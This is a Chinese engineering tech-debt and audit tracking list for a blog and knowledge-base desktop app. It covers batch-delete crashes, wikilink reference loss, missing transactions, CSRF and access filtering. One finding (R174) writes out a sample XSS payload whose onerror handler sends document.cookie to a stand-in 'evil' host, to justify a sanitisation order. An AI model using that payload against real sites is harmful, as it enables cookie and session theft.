# redo.md — 技术债与修复跟踪

> **定位**: 已发现但未修复的问题。与 [todo.md](todo.md) 的区别: todo.md = 功能路线图, redo.md = 修复清单。
> **角色协作**: Auditor 写入审查发现 → Developer 修复并更新状态 → Auditor 验证 → Boss 裁决分歧。
> **历史审计**: 已关闭的审计报告 → [docs/history-audit.md](docs/history-audit.md)
>
> 最后更新: 2026-05-18 | Phase 20 终审 — 13 PASS, 12 BROKEN, 4 PARTIAL。tsc 0 err, :any 0, as any 0

---

## 1. 输入格式规范

> **目的**: 保持文件精简。历史审计详情在问题关闭后移入"历史摘要"段（≤50 行）。

### Auditor 新增发现

```
| RXX | 严重性 | 问题 — 简洁描述 |
| **位置**: 文件:行号 |
| **后果**: 用户/开发者可见的影响 |
| **修复方向**: 建议 |
```

- 编号递增。每条 ≤5 行。必须标注文件:行号
- 必须描述"对谁产生了什么影响"——不写"可能影响"
- 🔴 P0 必须标注"阻断什么"

### Developer 修复

```
| RXX | ✅ 已修复 — 修复方式 (一句话) | **验证**: (留空) |
```

### Auditor 验证

```
| RXX | ✅ 验证通过 / 🔄 退回 — 证据 |
```

### 决策点 (Auditor 提 → Boss 裁决)

```
| DXX | 选项 A | 选项 B | 建议 | **Boss 裁决**: |
```

- 每轮审查 ≤5 个。Boss 裁决后关闭

### 禁止放入的内容

| 禁止 | 应放何处 |
|------|---------|
| 已完成 Phase 的完整审计报告 | 本文件"历史摘要"段 (≤2行/审计) |
| 已关闭 R-item 的完整修复/验证过程 | "历史摘要"段 (一行概括) |
| 需求/功能任务 | [todo.md](todo.md) |
| 代码实现方案 | 代码注释 / PR description |

---

## 2. 当前待修复

### 🔴 P0 (5 项) — Phase 20 立案前审查 + 深度审计新增 (2026-05-18)

**深度审计新增 (CRITICAL):**

| R204 | ✅ 已修复 — `data.blogIds.length` 解构修复 | **验证**: ✅ blog.ts:262,266 |
| R205 | ✅ 已修复 — `data.fileIds.length` 解构修复 | **验证**: ✅ knowledge.ts:110,114 |
| R206 | ✅ 已修复 — `extractWikilinkTitles()` 纯文本正则扫 `[[...]]` 替代 HTML 正则 | **验证**: ✅ wikilink.ts:73-85, blog.ts:14 |
| R207 | 📋 待修复 | `syncWikilinkRefs` 无事务包裹 — SELECT→INSERT→DELETE 无 BEGIN/COMMIT |

**R204 — blog:batchDelete 未解构变量崩溃**

| **位置** | `src/main/ipc/blog.ts:221` |
| **代码** | `return { success: true, data: { deleted: blogIds.length } }` — handler 参数为 `data: { userId, blogIds }`，未解构，`blogIds` 是 `undefined` |
| **后果** | 任何批删除操作 → `ReferenceError: blogIds is not defined` → catch 捕获但操作静默失败。用户永远无法批量删除博客 |
| **修复** | `data.blogIds.length` 或解构参数 `{ userId, blogIds }` |

**R205 — kb:batchDelete 未解构变量崩溃**

| **位置** | `src/main/ipc/knowledge.ts:114` |
| **代码** | `return { success: true, data: { deleted: fileIds.length } }` — 同 R204 模式 |
| **后果** | 知识文件批删除永久不可用 |
| **修复** | `data.fileIds.length` |

**R206 — syncWikilinkRefs 管道三重断裂（数据丢失级 bug）**

| **位置** | `src/main/ipc/blog.ts:92,105` + `src/shared/wikilink.ts:56-69` + `src/renderer/features/blog/BlogEditorPage.tsx:288` |
| **断裂链** | ① md 格式: BlogEditorPage 通过 turndown 转 HTML→Markdown → 保存内容为 `[[Blog B]]\n` 纯文本 → `extractWikilinkRefs` 正则 `/&lt;a class="wiki-link"/g` 永远匹配不到；② html 格式: Tiptap 无 wikilink Extension (R197) → `[[...]]` 保留为文字文本、从不生成 `<a class="wiki-link">`；③ 即使渲染后提取、属性名也不匹配（`data-wiki-title` vs `data-ref-type`） |
| **后果** | `extractWikilinkRefs` 永远返回空数组 `[]` → `syncWikilinkRefs` diff 判定"所有已有 ref 都应删除" → 每次保存博客时 DELETE 该博客的全部 refs 行。更严重的是：通过 ReferencePicker **手动添加的引用**也被一并删除（refs 表不区分自动/手动来源）。保存博客 = 丢失所有引用关系 |
| **修复** | 短期: 在 syncWikilinkRefs 入口处直接对 raw content 做 `[[...]]` 正则扫描（纯文本正则、不依赖 HTML），绕过整个渲染管线；长期: Tiptap wikilink Extension 实现后、在 blog:update handler 中先 md.render(content) → 再 extractWikilinkRefs |

**R207 — syncWikilinkRefs 无事务**

| **位置** | `src/main/ipc/blog.ts:11-38` |
| **后果** | SELECT → 逐条 INSERT → 逐条 DELETE 无 BEGIN/COMMIT 包裹。并发保存或进程崩溃 → refs 表部分更新 → 图谱数据损坏 |
| **修复** | 包裹在 `dbRun('BEGIN IMMEDIATE')` / `dbRun('COMMIT')` 中 |

---

**立案前存量:**

| R170 | ✅ 已修复 — refs CHECK 移除 + 应用层校验 (D54=A)，types.ts RefType 加 'note'，reference.service.ts resolveTitle 加 'note' 分支 | **验证**: (留空) |
| R171 | ✅ 已修复 — notes CHECK 移除 + 应用层校验 (D54=A)，types.ts MemoType 加 'daily'，note.service.ts 校验 | **验证**: (留空) |
| R172 | 📋 待修复 | MCP Server `stdio.ts` 放在 Express 目录 — stdio 独占 stdin/stdout 与 Express 事件循环冲突 |
| R173 | ✅ 已修复 — blog.ts syncWikilinkRefs() 扫描diff (D58), BLOG_CREATE+UPDATE 调用 | **验证**: ✅ blog.ts:10-38 扫描→SELECT→diff→INSERT/DELETE, BLOG_CREATE L92 + BLOG_UPDATE L105 |
| R174 | ✅ 已修复 — DOMPurify 管线 md.render→renderWikilinks(code保护)→DOMPurify→渲染 | **验证**: ✅ BlogPreviewPage L296-297+L455, wikilink.ts:18-53 CODE_TAGS extract-restore |

**R170 — refs CHECK 约束与 D48 三向链接冲突**

| **位置** | `src/main/db/schema.ts:94-97`, `src/main/services/reference.service.ts:23,25,98-108`, `src/shared/types.ts:211-213` |
| **后果** | sql.js 用户创建便签 wikilink → `INSERT INTO refs (source_type='note', ...)` → CHECK 约束静默拒绝 → 图谱反向链接永久缺失。ReferenceService.resolveTitle() 遇 `'note'` 类型走 `knowledge` 分支、可能返回错误标题 |
| **修复方案** | **三步**: ① SQLite — `db/index.ts` 新增迁移重建 refs 表（`CREATE TABLE refs_new` → `INSERT SELECT` → `DROP` → `RENAME`），CHECK 扩展为 `IN ('blog','knowledge','note')`；② MySQL — 已有 `VARCHAR(20)` 无 CHECK 约束，仅需确认迁���已覆盖；③ TypeScript — `types.ts` 中 `Reference.sourceType/targetType` 加 `\| 'note'`；`reference.service.ts` 中 `rowToReference` 类型断言更新 + `resolveTitle` 加 `type === 'note'` 分支（查 notes 表 title） + `searchItems` 加 `'note'` scope |
| **更优替代** | 移除 DB 层 CHECK，全部改为应用层校验。理由：refs 是关联表、数据完整性由外键和 UNIQUE 约束保证。CHECK 在此是额外防御但代价高（需表重建）。应用层在 `ReferenceService.addRef()` 入口做 `if (!['blog','knowledge','note'].includes(sourceType)) throw`，等价防护但零迁移成本 |

**R171 — notes.memo_type CHECK 拒绝 'daily'**

| **位置** | `src/main/db/schema.ts:109`, `src/shared/types.ts:183`, `src/main/services/note.service.ts:12,53,71`, `src/main/ipc/note.ts:28`, `src/shared/window-api.ts:151` |
| **后果** | sql.js 用户创建每日便签时 `INSERT INTO notes (memo_type='daily', ...)` → CHECK 约束抛 SQL error → 便签创建失败、HomePage 空白 |
| **修复方案** | ① `schema.ts:109` — CHECK 扩展为 `IN ('note','schedule','todo','daily')`，需重建 notes 表（同 R170 模式）；② `db/index.ts` — 新增 ALTER TABLE 迁移；③ 6 处 TypeScript 联合类型同步加 `\| 'daily'`（types.ts / note.service.ts×3 / note.ts / window-api.ts）；④ MySQL 侧已用 `VARCHAR(10)` 无约束、无需变更 |
| **更优替代** | **建议放弃 DB 层 CHECK 改用应用层校验**。理由: ① 每加一个 memoType 值都要表重建 — 成本高；② `note.service.ts` 的 TypeScript 联合类型已经是编译期守卫；③ 宽进严出模式 — DB 存字符串、TS 限制合法值 — 比双重约束（DB+TSC）更灵活。迁移只需 `ALTER TABLE notes ADD COLUMN` 不需动 CHECK |

**R172 — MCP Server 进程模型未定义**

| **位置** | `todo.md:330-345` |
| **后果** | `src/server/mcp/transport/stdio.ts` 放在 Express 服务器目录。stdio 传输需独占 stdin/stdout → 若嵌入 Express 进程则启动即崩溃。若 fork 子进程则需生命周期管理（信号转发、关闭编排）— 当前 spec 未指定任一方案，实现时必然返工 |
| **修复方案** | **拆分两种传输到不同入口**: ① `src/mcp-server/index.ts` — stdio 模式独立 CLI 入口（`npm run mcp`），`process.stdin/stdout` 流直连；② `src/server/routes/mcp.ts` — HTTP 模式通过现有 Express 路由暴露（端口 3456），复用 JWT Cookie 认证。工具实现层放到 `src/mcp-server/tools/`，两种传输共用。不引入第二端口，不引入 CSRF 问题 |
| **核心洞察** | MCP 的 HTTP 模式应该是 Express 路由、不是独立服务器。同一个 3456 端口 + 同一个 JWT Cookie = 零 CSRF 增量风险。stdio 模式是独立进程、天然无认证问题（调用方即本地用户） |

**R173 — blog:update + ref:add 非原子操作**

| **位置** | `todo.md:312-315` |
| **后果** | 用户保存博客 → `blog:update` 成功 → 网络抖动导致 `ref:add` 失败 → wikilink 在内容中存在但引用关系缺失 → 上下文面板不显示反向链接。用户无感知无恢复路径 |
| **修复方案** | **放弃"实时同步 ref"模式，改用"语义扫描 + 定期修复"**: ① wikilink Tiptap 扩展只管插入 `<a class="wiki-link">` 到内容，不主动调 `ref:add`；② `blog:update` 成功后，IPC handler 扫描内容中的 `data-ref-id` 属性、批量 `INSERT OR IGNORE INTO refs`；③ 定期 `cleanOrphanRefs()` 清理指向已删除内容的引用（已有 `ReferenceService.removeRef`）。方案优势：单 IPC 调用、单事务、幂等、可修复 |
| **更优替代** | 如果 wiki-link 节点删除难检测（ProseMirror 无原生事件），放弃实时 `ref:remove`。改为 `blog:update` 时扫描内容中现存 wiki-link → 与 refs 表 diff → 删多余、补缺失。一次性解决"创建"和"删除"两个方向 |

**R174 — [[wikilink]] DOMPurify 管线顺序未定**

| **位置** | `todo.md:317-320` |
| **后果** | 场景A（正则在后）: 恶意标题 `[[<img onerror=fetch('http://evil/'+document.cookie)>|显示]]` → wikilink 正则注入 `<a>` 标签绕过 DOMPurify → 存储型 XSS。场景B（正则在前+html:false）: `md.render()` 转义 `<a>` 为 `&amp;lt;a` → wikilink 不渲染。当前 `BlogPreviewPage.tsx:48` 使用 `html:false` —— 如果实现者选 B 则 wikilink 全部损坏 |
| **修复方案** | **管线顺序固定为**: `md.render(mdContent)` → wikilink 正则替换 HTML 字符串中的 `[[...]]` → `DOMPurify.sanitize(html)` → `dangerouslySetInnerHTML`。此顺序的安全性依赖: ① `md.render()` 已转义用户输入的 HTML 标签；② wikilink 正则匹配的是**文本** `[[...]]`（非 HTML），注入的 `<a>` 标签不含用户可控属性值；③ `DOMPurify` 作为最后防线、默认允许 `<a>` 但拒绝 `javascript:` 协议。额外防御: wikilink 正则只匹配 `[[` + 非控制字符 + `]]`，`href` 用 `/blog/N` 或 `/note/N` 纯数字路径（非用户输入） |
| **已知限制** | `todo.md:340` 管线 Step 2 的正则 `/\[\[([^\]|]+)(?:\|([^\]]+))?\]\]/g` 在 `md.render()` 之后执行，会误匹配 `<code>`/`<pre>` 块内的 `[[text]]`。用户在代码示例中写 `[[演示]]` → 被错误转换为真实链接。这是纯正则方案的固有缺陷，Obsidian 等成熟产品也存在。两种修复路径: A) 改用 markdown-it 插件在 token 层面替换 wiki-link（AST 感知，不误伤代码块）；B) 正则加负向前瞻排除 `<code>` 内匹配。**Boss 裁决: Phase 20B 用方案 B (负向前瞻热修复, 0.3h)，Phase 21 迁移方案 A (markdown-it 插件)。** 已知限制可接受，不阻断 20A 启动 |

---

### 🔴 P0 验证轮新增 (2026-05-18)

| R194 | ✅ 已裁决 | 每日便签创建非幂等 → 🔄 PARTIAL — 客户端 SELECT-then-INSERT 已实现 (HomePage.tsx:110-126)，IPC handler 缺防护 |
| R195 | ✅ 已裁决 | ContextPanel 路由白名单 — 仅 /blog/:id, /blog/:id/edit, /knowledge, /graph 显示面板 (D55 已覆盖) |
| R196 | ✅ 已裁决 | MCP tools 独立 SQL — 方案 A (dbAll/dbRun 直写), 不 import main/services (D55 已覆盖) |

**R194 — 每日便签创建非幂等**

| **位置** | `todo.md:225` |
| **后果** | 用户打开 HomePage → 创建 daily note → 导航到 /blog → 返回 HomePage → 再次创建 daily note → 同一天出现多条 `memoType='daily'` 便签 |
| **修复方案** | `note:createDaily` IPC handler 内先 `SELECT WHERE memo_type='daily' AND DATE(due_date)=CURDATE() AND user_id=?` → 存在则返回已有 note、不创建。约 5 行 SQL + 条件判断 |

**R195 — ContextPanel 在不需要的页面行为未定义**

| **位置** | `todo.md:223,391-397` |
| **后果** | MainLayout 3 栏包裹全部 14 条路由，但 SettingsPage/TagManagePage/RecycleBinPage 等无链接/大纲/属性 → 右侧面板显示空 Tab 或默认界面 → 用户困惑 |
| **修复方案** | 给 ContextPanel 加 `enabledRoutes` 白名单（/blog/:id, /blog/:id/edit, /knowledge, /graph）或 `hiddenRoutes` 黑名单。非白名单路由 → ContextPanel 完全隐藏，MainLayout 退化为 2 栏 |

**R196 — MCP tools 无法直接 import main/services**

| **位置** | `todo.md:354-365` |
| **后果** | `src/mcp-server/tools/search.ts` import `SearchService` from `src/main/services/` → `src/main/` 目录约束为"Electron 主进程"，MCP stdio 模式是不依赖 Electron 的独立 Node.js 进程 → 虽可编译通过但违反架构约定。若 SearchService 依赖 `src/main/db/`（sql.js WASM 初始化），stdio 模式可能因缺少 Electron 环境而启动失败 |
| **修复方案** | 两种选择: A) 工具函数不 import Service，直接通过 `dbAll/dbRun` 写独立 SQL — 复制少量查询逻辑但零耦合风险；B) 将 Service 中纯 DB 查询方法抽到 `src/shared/handlers/`（已有 blog-crud.ts/knowledge-crud.ts 先例）— 架构更干净但工时 +0.5-1h。**建议 A** 先行，MCP 工具本质是只读包装器、SQL 简单 |

---

### 已修复 (P0 存量) ✅

| R158 | ✅ 已修复 — blogs INSERT 补 content/folder_id/series_id/series_name，tags 补 description，knowledge_files 补 content_text/folder_id | ✅ 已验证 — L283-284, L291-293, L319-320 全加列 + null coalescing |

### 🟠 P1 (5 项) — Phase 20 立案前审查

| R175 | 📋 待修复 | MCP HTTP CSRF — Cookie 在 localhost 端口间自动共享，同源策略不隔离端口 |
| R176 | ✅ 已修复 — properties 列 4 处同步: schema.ts + db-schema-mysql.ts (DDL+MIGRATIONS) + db/index.ts (迁移+INSERT) + types.ts (KnowledgeFile) | **验证**: (留空) |
| R177 | ✅ 已修复 — tray.ts 9 处 emoji 标签全部替换为纯文本 (D60=A) | **验证**: (留空) |
| R178 | 📋 待修复 | 3 新 IPC 通道三方注册链（5 步×3=15 处变更）未追踪 |
| R179 | 📋 待修复 | T2005 "自动创建"触发时机未定义 — 三种技术方案差异大 |

**R175 — MCP HTTP CSRF（已由 R172 方案间接消除）**

| **位置** | `todo.md:344` |
| **后果** | 若 MCP HTTP 在独立端口 3457: 恶意网页 fetch `localhost:3457` → Cookie 自动附加 → 读取用户全部数据。`create_note`"需确认"机制未指定 → 无法防御 |
| **修复方案** | **由 R172 方案自然解决** — 将 MCP HTTP 嵌入现有 Express（端口 3456）+ 现有路由 + 现有 JWT Cookie = 零新增攻击面。如果必须独立端口: 用 `Authorization: Bearer <token>` header 代替 Cookie（localStorage 读取 token → MCP 客户端手动附加 → 浏览器不自动发送），不依赖 Cookie 的同源策略 |

**R176 — properties 列迁移间隙**

| **位置** | `src/main/db/schema.ts:39-51`, `src/shared/db-schema-mysql.ts:47-55,99-118`, `src/main/db/index.ts:66-124` |
| **后果** | SQLite 旧库: `SELECT * FROM knowledge_files` 无 `properties` 列 → 代码读 `row.properties` 返回 `undefined`（不崩溃但功能无效）。MySQL 旧库: 同。新库正常 |
| **修复方案** | 4 处清单: ① `schema.ts:47` — `CREATE TABLE knowledge_files` 加 `properties TEXT DEFAULT '{}'`；② `db-schema-mysql.ts:52` — `knowledge_files` CREATE TABLE 加 `properties TEXT`；③ `db-schema-mysql.ts:118` — `MYSQL_MIGRATIONS` 追加 `ALTER TABLE knowledge_files ADD COLUMN properties TEXT DEFAULT '{}'`；④ `db/index.ts:99` — 新增 try-catch `ALTER TABLE knowledge_files ADD COLUMN properties TEXT DEFAULT '{}'`。所有 4 处必须在 T2009 实现前完成 |

**R177 — 托盘菜单无法使用 Lucide SVG**

| **位置** | `src/main/tray.ts:69-96`, `todo.md:269` |
| **后果** | 实现者尝试在 tray.ts 的 `Menu.buildFromTemplate()` 中替换 emoji → 发现 Electron 原生 Menu 不支持 SVG → 两种选择: (a) 从 Lucide 提取 PNG 建图标管线（~2-4h 额外），(b) 用纯文本标签。若无 Boss 裁决，实现者浪费时间探索方案 |
| **修复方案** | **用纯文本标签代替 emoji**: `'📝 快速便签'` → `'快速便签'`, `'✎ 新建博客'` → `'新建博客'`。不引入 PNG 管线。理由: ① 托盘菜单是系统级上下文菜单，用户按右键快速操作，不以视觉为导向；② macOS/Win 原生菜单从未使用 emoji——纯文本是平台惯例；③ 零额外工时 |
| **Boss 需确认** | 托盘菜单是否接受"纯文本无图标"？还是必须保留 emoji 作为快速视觉标识？ |

**R178 — 3 新 IPC 通道注册链未追踪**

| **位置** | `todo.md:368` |
| **后果** | Developer 逐一实现时漏掉 preload 暴露或 api-client stub → 编译期无报错（`as WindowApi` 遮蔽）→ 运行时报 `undefined is not a function` → 调试时间远大于预防成本 |
| **修复方案** | 每个新通道必须检查 5 个注册点的 checklist（在 Phase 20 任务中显式列出）: ① `ipc-channels.ts` 常量 ② `main/ipc/*.ts` handler + `index.ts` register ③ `preload/index.ts` contextBridge ④ `window-api.ts` 类型签名 ⑤ `api-client.ts` webApi 降级 stub。对 `mcp:*` — 它不是 IPC，不应出现在此表中 |

**R179 — T2005 自动创建时机未定义**

| **位置** | `todo.md:225` |
| **后果** | 三种实现解释: A=HomePage 挂载检查 / B=主进程午夜定时器 / C=app.on('ready')。选 A: 用户全天不打开 HomePage 则无当日便签。选 B: 需 timer 生命周期管理 + 跨天处理 + 用户从不打开 HomePage 也创建了无用便签。选 C: 仅启动时创建一次。无明确指定则返工 |
| **修复方案** | **建议用 A（HomePage 挂载检查）** — 理由: ① 用户在 HomePage 首次看到"今日便签"才需要它；② 实现最简 — `useEffect(() => { const today = new Date().toISOString().slice(0,10); if (!noteForToday) createDaily(); }, [])`；③ 零后台资源消耗。Boss 可选 B 方案（后台定时器），但需额外 0.5-1h |

---

### 已修复 (P1 存量) ✅

| R159 | ✅ 已修复 — updateNote/togglePin 3 处 SELECT 全部加 AND user_id = ? | ✅ 已验证 — L85, L95, L98 全加 user_id 参数化 |

### 🟡 P2 (8 项) — Phase 20 立案前审查 + 实施审计新增

**实施审计新增 (2026-05-18):**

| R197 | ✅ 已修复 — WikilinkSuggestion.tsx + TiptapEditor [[ 检测 + 弹窗 | **验证**: ✅ TiptapEditor.tsx:9,54-62,179-181 |
| R198 | 📋 待修复 | T2013 MiniGraph 用圆形布局代替 D3 forceSimulation — 与 spec (D49) 不符 |
| R199 | ✅ 已修复 — `WikiLinkSearchResult` interface types.ts:226-230 | **验证**: ✅ |
| **R207** | 📋 深度审计 | graph.ts LIMIT 无 ORDER BY — 全部 7 处查询节点选择非确定性 |
| **R208** | 📋 深度审计 | blog:batchDelete 不清理 refs — BLOG_DELETE 已补偿，BATCH_DELETE 未 |
| **R209** | 📋 深度审计 | `renderWikilinks` 无 resolver 调用方 → broken-link 渲染路径为死代码 |
| **R210** | ✅ 已修复 — useEffect 依赖加 `isEditMode`，编辑模式切换后重取 | **验证**: ✅ BlogPreviewPage.tsx:225 |
| **R211** | ✅ 已修复 — try-catch 包裹 JSON.parse | **验证**: ✅ knowledge.service.ts:215, knowledge-crud.ts:109-112 |
| **R212** | ✅ 已修复 — BLOG_QUICK_CREATE L365 调用 syncWikilinkRefs | **验证**: ✅ |
| **R220** | 📋 终审 | WikilinkSuggestion 无键盘导航 — 箭头/Enter/Escape 未实现，纯鼠标交互 |
| **R221** | 📋 终审 | `kb:set-properties` 不发 EVT_KB_REFRESH — 知识列表不更新 |
| **R222** | 📋 终审 | `reference.service.ts` searchItems scope 不含 `'note'` |
| **R223** | 📋 终审 | MiniGraph + GraphPage 不订阅任何 refresh 事件 — 数据永久陈旧 |

**立案前存量:**

| R180 | 📋 待修复 | 图谱类型 (GraphNode/GraphEdge/GraphData/GraphFilter) 未定义 — 4 种新 IPC/组件块类型缺失 |
| R181 | ✅ 已修复 — graph.ts 全 8 处查询 user_id 过滤, refs 边三重 LEFT JOIN 分源表隔离 | **验证**: ✅ graph.ts:18,29,40,51,61,69,79-88 所有 JOIN 带 user_id |
| R182 | ✅ 已修复 — TODO.md IPC 变更表已移除 mcp, 独立说明 MCP 非 Electron IPC | **验证**: ✅ todo.md:403 明确"不列入 IPC 变更表" |
| R183 | ✅ 已修复 — BlogPreviewPage.tsx migrateTheme() forest→dark, sakura→light, paper→sepia, midnight→dark | **验证**: ✅ BlogPreviewPage.tsx:164-173 迁移映射 |
| R184 | 📋 待修复 | DashboardPage(408行)+ContinueWritingPage(213行) 并入 HomePage 后文件去留未定 |
| R185 | 📋 待修复 | T2009 `properties` JSON schema 未定义 — 自由 JSON 或结构化字段决定 UI 形态 |
| R186 | 📋 待修复 | ContextPanel React Context 跨页面 Tab 泄漏 — 页面 A 卸载时清理 vs B 注册竞态 |
| R187 | 📋 待修复 | T2002 MainLayout 影响 14 条路由 + T2010 BlogEditorPage 双重重构 — 同时改布局和编辑器 |

**R180 — 图谱类型全部缺失**

| **位置** | `src/shared/types.ts` — 需新增 ~40 行类型定义 |
| **后果** | 无 `GraphNode`/`GraphEdge`/`GraphData` → T2012-T2014 实现时被迫用 `Record<string,unknown>` 或 `any` → TypeScript 失去类型检查 → `:any` renderer 从 0 回升 |
| **修复方案** | 新增类型: `GraphNode { id: string; label: string; type: 'blog'\|'knowledge'\|'tag'\|'note'; x?: number; y?: number; vx?: number; vy?: number; fx?: number \| null; fy?: number \| null }` — D3 `SimulationNodeDatum` 兼容；`GraphEdge { source: string; target: string; type: 'ref' \| 'tag' }`；`GraphData { nodes: GraphNode[]; edges: GraphEdge[] }`；`GraphFilter { types?: GraphNodeType[]; dateRange?: { from?: string; to?: string }; tagIds?: number[]; maxNodes?: number }`。关键设计决策: `x/y/vx` 等 D3 物理属性直接放 GraphNode 而非分两个类型 — 避免 `as any` 转换 |

**R181 — graph:getData 缺 user_id 过滤**

| **位置** | `todo.md:232-233,368` |
| **后果** | 桌面端单用户无影响。Web 端多用户部署: `SELECT ... FROM refs JOIN blogs JOIN tags` 无 WHERE user_id → 返回所有用户的数据 → 图谱展示跨用户的节点和边 |
| **修复方案** | `graph:getData` handler 签名加 `userId: number`。底层查询: `WHERE blogs.user_id = ? AND knowledge_files.user_id = ? AND tags.user_id = ?` 三重过滤。遵循 AGENTS.md 纵深防御原则 — 即使 refs 表无 user_id 列，通过 JOIN 的源表 user_id 字段做隔离 |
| **注意** | refs 表本身无 user_id 列（设计为跨用户引用标题）— 这不是 bug。但图谱聚合查询必须通过 JOIN 的 blogs/knowledge_files/tags 表带 user_id 过滤 |

**R182 — mcp:* 误列 IPC 变更表**

| **位置** | `todo.md:368` |
| **后果** | Developer 在 `ipc-channels.ts` 添加 `MCP_*: 'mcp:*'` → `ipcMain.handle('mcp:*')` 非 Electron 通配符 → 运行时静默无效 |
| **修复方案** | 将 MCP 通信从 IPC 变更表中移除。替换为: `MCP Server: stdio 模式 (独立 CLI) + HTTP 模式 (Express 路由 /api/mcp/*)，均走独立传输协议，非 Electron IPC` |

**R183 — 主题精简无迁移**

| **位置** | `todo.md:231` |
| **后果** | 用户 localStorage 存 `reading-theme: 'forest'` → 升级后 `READING_THEMES['forest']` = `undefined` → 降级到 `READING_THEMES.paper` → 用户看到完全不同的配色、困惑 |
| **修复方案** | 在主题加载代码加迁移映射: `const MIGRATE: Record<string,string> = { forest:'dark', sakura:'light', paper:'sepia', midnight:'dark' }`；读取时: `const raw = localStorage.getItem('reading-theme'); const migrated = MIGRATE[raw] ?? raw`。约 5 行 JS，0.2h |

**R184 — 被合并页面的源文件去留**

| **位置** | `todo.md:224, D53` |
| **后果** | 文件保留: Lint 工具报警告、新 Developer 混淆入口页。文件删除: 丢失历史参考。无明确指示则实现者自由裁量 |
| **修复方案** | 建议: 删除 `DashboardPage.tsx` + `ContinueWritingPage.tsx`（功能完全并入 HomePage），`CalendarView.tsx` 移入 `src/renderer/components/`（HomePage 之外仍可复用）。删除前 grep 验证无其他文件 import 它们 |

**R185 — properties JSON schema 空白**

| **位置** | `todo.md:229` |
| **后果** | "属性面板编辑"的 UI 取决于 schema: 若自由 JSON → 单行 textarea（简单但不可用）；若结构化字段 → 表单生成器（可用但 3h 不够） |
| **修复方案** | 建议 MVP: 结构化预设字段 `{ author?: string, source?: string, notes?: string }` + 表单 UI（3 个 label+input）。不开放自由 JSON 编辑（用户不需要写 JSON）。字段集可后续扩展 |

**R186 — ContextPanel Tab 注册竞态**

| **位置** | `todo.md:223` |
| **后果** | 页面 A(注册 Tab 链路) → 快速导航到页面 B → 页面 A 的 useEffect cleanup(移除 Tab 链路) 可能在页面 B 注册后执行 → ContextPanel 展示上一页的 Tab → 功能错乱 |
| **修复方案** | ContextPanel 注册机制加 **所有权 token**: ① Provider 分配 `sessionId`（每次路由变化 +1）；② `useContextPanel(tabs)` 获取当前 sessionId 存 ref；③ cleanup 时检查 `ref.sessionId === provider.sessionId`，不匹配则跳过清理。保证旧页面的 cleanup 不覆盖新页面的注册 |

**R187 — MainLayout + BlogEditorPage 双重重构**

| **位置** | `todo.md:222,230` |
| **后果** | T2002 全应用加右侧 280px 面板 → BlogEditorPage 编辑器宽度减少 → T2010 同时重构编辑器底部 Tab → 布局 bug 时分不清是谁的问题。两个高度复杂组件同时大改 |
| **修复方案** | 建议实施顺序: 先 T2002→T2003（3栏布局+ContextPanel框架），验证所有页面在新布局下正常工作 → 再做 T2010（编辑器底部 Tab 化）。中间插入一个验证点 |

---

### 已修复 (P2 存量) ✅

| R160 | ✅ 已修复 — blog.ts/knowledge.ts 改用 buildXxxDelete(id, userId) 变体消除 TOCTOU | ✅ 已验证 — blog.ts L153 buildBlogDelete(id,userId), knowledge.ts L172 buildKnowledgeDelete(id,userId) |
| R161 | ✅ 已修复 — :any 11→3: KnowledgeListPage backRefs + BlogPreviewPage refs 类型化为 Reference; TagManagePage map 回调类型化 | ✅ 已验证 — grep 确认 renderer `: any` 仅剩 3 处 (KnowledgeListPage 2 + ReferencePicker 1 TODO) |
| R162 | ✅ 已修复 — FolderService.getFolderTree() + server route GET /tree 改用 buildFolderTreeQuery，server route POST /create 改用 buildFolderDuplicateCheck/buildFolderCreate | ✅ 已验证 — folder.service.ts L3 import + L18 调用; folder.ts L2-6 import + L19/L36/L40 全部使用 |
| R163 | ✅ 已修复 — webApi 补 onBlogRefresh + onTrayAction + onPetAction + onUpdateStatus 空 stub | ✅ 已验证 — api-client.ts L158/L162/L163/L164 4 个 `() => () => {}` stub |
| R164 | ✅ 已修复 — noteList 全链路 (WindowApi→preload→IPC→Service) 加 dueDateFrom/dueDateTo，CalendarView 传当月首尾日期 | ✅ 已验证 — WindowApi L148 + preload L161 + IPC L16 + Service L28 + CalendarView L34-37 全链路通过 |

### 🟢 P3 (6 项) — Phase 20 立案前审查 + 实施审计新增

**实施审计新增 (2026-05-18):**

| R200 | ✅ 已修复 — ContextPanel resize 监听 + narrow 状态守卫 | **验证**: ✅ ContextPanel.tsx:94,103-107,121-122 |
| R201 | 📋 待修复 | T2008 大纲 Tab 缺当前位置高亮 — 标题树为静态列表，无 IntersectionObserver |
| R202 | 🔄 PARTIAL | fadeUp/edge-breathe keyframes 已移除，但 `.card:hover` L271-275 仍有硬编码 shadow+translateY |
| R203 | ✅ 已修复 — CalendarView.tsx 已迁移到 components/，旧路径删除 | **验证**: ✅ |
| **R213** | 📋 深度审计 | 1280px 屏幕内容区 732px可用 < 780px content-max |
| **R214** | 📋 深度审计 | 侧边栏折叠态导航缺 `aria-label` — 仅有 title 属性 |
| **R215** | 📋 深度审计 | CommandPalette Tab 键可逃逸到背景 — WCAG 2.1.2 |
| **R216** | 📋 深度审计 | GraphPage/MiniGraph SVG 零 ARIA/键盘 — 纯鼠标交互 |
| **R217** | 📋 深度审计 | 深色主题 + sepia 链接 #58a6ff/#f8f5ef ≈ 2.2:1 (需 4.5:1)，theme.accent 定义但未使用 |
| **R218** | 📋 深度审计 | 侧边栏折叠用 `width` transition 而非 `transform` |
| **R219** | 📋 深度审计 | syncWikilinkRefs 未导出 — knowledge/note handler 无 wikilink ref 同步 |
| **R224** | 📋 终审 | 博客编辑器草稿恢复横幅硬编码金色背景 + 灰色文字不一致 |

**立案前存量:**

| R188 | 📋 待修复 | T2018 测试 3h → 现实 8-12h，工时误差 2.7-4x |
| R189 | 📋 待修复 | 所有新数据组件缺 error/loading/empty 三元态规划 — R165/R168/R149 三类回归风险 |
| R190 | 📋 待修复 | 所有新异步组件缺 `abortedRef` 竞态守卫 — R152 回归风险 |
| R191 | 📋 待修复 | Phase 20 整体工时 58.5h → 现实 85-100h，T2002/T2003/T2004/T2006 各低估 2-3x |
| R192 | ✅ 已修复 — index.css: --radius-card 8px, --shadow-card none, accent-amber/purple 保留别名 | **验证**: ✅ index.css:41,45,82+ L17-19 别名标注 T2017 cleanup |
| R193 | ✅ 已修复 — MainLayout toggle 按钮 aria-expanded+aria-label+Ctrl+B 快捷键 | **验证**: ✅ MainLayout.tsx toggle button + Ctrl+B ShortcutService |

**R188 — 测试工时严重低估**

| **位置** | `todo.md:238` |
| **后果** | Developer 在 3h 内只能做"机械验证"（tsc+build+跑现测试），8 个新 Service 方法 + 3 个 IPC handler + 5 个新组件全无测试 → 回归风险剧增 |
